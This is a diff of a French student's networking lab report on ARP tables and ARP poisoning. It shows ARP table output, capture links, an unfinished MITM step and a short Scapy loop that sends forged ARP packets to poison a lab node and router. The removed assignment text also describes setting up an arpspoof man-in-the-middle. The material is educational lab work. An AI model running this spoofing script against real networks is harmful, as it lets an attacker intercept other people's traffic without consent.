@@ -157,117 +157,37 @@ VPCS>
 
 # III. ARP
 ## 1. Les tables ARP
-
-  
-
-ARP est un protocole qui permet d'obtenir la MAC de quelqu'un, quand on connaît son IP.
-
-  
-
-On connaît toujours l'IP du correspondant avant de le joindre, c'est un prérequis. Quand vous tapez `ping 10.2.1.1`, vous connaissez l'IP, puisque vous venez de la taper :D
-
-  
-
-La machine va alors automatiquement effectuer un échange ARP sur le réseau, afin d'obtenir l'adresse MAC qui correspond à `10.2.1.1`.
-
-  
-
-Une fois l'info obtenue, l'info "telle IP correspond à telle MAC" est stockée dans la **table ARP**.
-
-  
-
-> Pour toutes les manips qui suivent, référez-vous au [mémo réseau Rocky](../../memo/rocky_network.md).
-
-  
-
 🌞 **Affichez la table ARP de `router.tp2.efrei`**
-
-  
-
-- vérifiez la présence des IP et MAC de `node1.tp2.efrei` et `dhcp.tp2.efrei`
-
-- s'il manque l'une et/ou l'autre : go faire un `ping` : l'échange ARP sera effectuée automatiquement, et vous devriez voir l'IP et la MAC de la machine que vous avez ping dans la table ARP
-
-  
-
+```
+[root@localhost ~]# ip neighbor
+10.2.1.253 dev enp0s8 lladdr 08:00:27:bb:d8:e2 REACHABLE
+10.2.1.10 dev enp0s8 lladdr 00:50:79:66:68:00 STALE
+192.168.122.1 dev enp0s3 lladdr 52:54:00:24:5d:59 REACHABLE
+```
 🌞 **Capturez l'échange ARP avec Wireshark**
-
-  
-
-- je veux une capture de l'échange ARP livrée dans le dépôt Git
-
-- l'échange ARP, c'est deux messages seulement : un ARP request et un ARP reply
-
-  
-
+[échange ARP](echange_ARP.pcapng)
 ## 2. ARP poisoning
-
-  
-
-**Insérer une machine attaquante dans la topologie. Un Kali linux, ou n'importe quel autre OS de votre choix.**
-
-  
-
 🌞 **Envoyer une trame ARP arbitraire**
-
-  
-
-- depuis la machine attaquante, envoyer un message à la victime (`node1.tp2.efrei`)
-
-- en utilisant la commande `arping`
-
-- écrivez des données arbitraires dans la table ARP de `node1.tp2.efrei`
-
-  
-
+```
+2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
+    link/ether 08:00:27:59:94:8e brd ff:ff:ff:ff:ff:ff
+    inet 10.0.2.4/24 brd 10.0.2.255 scope global dynamic eth0
+       valid_lft 86371sec preferred_lft 86371sec
+    inet6 fe80::a00:27ff:fe59:948e/64 scope link noprefixroute
+       valid_lft forever preferred_lft forever
+```
 🌞 **Mettre en place un ARP MITM**
 
-  
-
-- setup un MITM (man-in-the-middle) à l'aide d'ARP poisoning
-
-- il faut se mettre entre `node1.tp2.efrei` et `router.tp2.efrei`
-
-- donc il faut ARP spoof pour que :
-
-  - `node1` pense que la MAC de `router` c'est la MAC de l'attaquant
-
-  - `router` pense que la MAC de `node1` c'est la MAC de l'attaquant
-
-  - ainsi, tous les messages échangés entre les deux, seront en réalité envoyés à l'attaquant
-
-- utilisez la commande `arpspoof` pour faire ça
-
-  - une seule commande suffit pour mettre en place toute l'attaque
-
-  
-
-> Il sera nécessaire d'activer l'IPv4 forwarding sur la machine attaquante. L'IPv4 forwarding permet à la machine attaquante d'accepter les paquets IP qui ne lui sont pas destinées (c'est à dire : agir comme un routeur).
-
-  
+# à finir !!
 
 🌞 **Capture Wireshark `arp_mitm.pcap`**
 
-  
-
-- la victime ping `1.1.1.1`
-
-- la capture Wireshark est réalisée depuis la machine attaquante
-
-- on doit voir les pings de la victime qui circulent par la machine attaquante
-
-  
-
+[arp_mitm](arp_mitm.pcap.pcapng)
 🌞 **Réaliser la même attaque avec Scapy**
+```
+from scapy.all import *
 
-  
-
-- un ptit script Python qui met en palce exactement la même attaque
-
-- l'intérêt est de commencer à utiliser Scapy avec une attaque que vous connaissez déjà (donc la seule barrière doit être l'apprentissage de la yntaxe Scapy)
-
-- remettre le script `arp_mitm.py` dans le dépôt git de rendu
-
-  
-
-![ARP sniffed ?](img/arp_sniff.jpg)
+while True:
+        send(ARP(pdst="10.2.1.10", psrc="10.2.1.254"))
+        send(ARP(pdst="10.2.1.254", psrc="10.2.1.10"))
+```
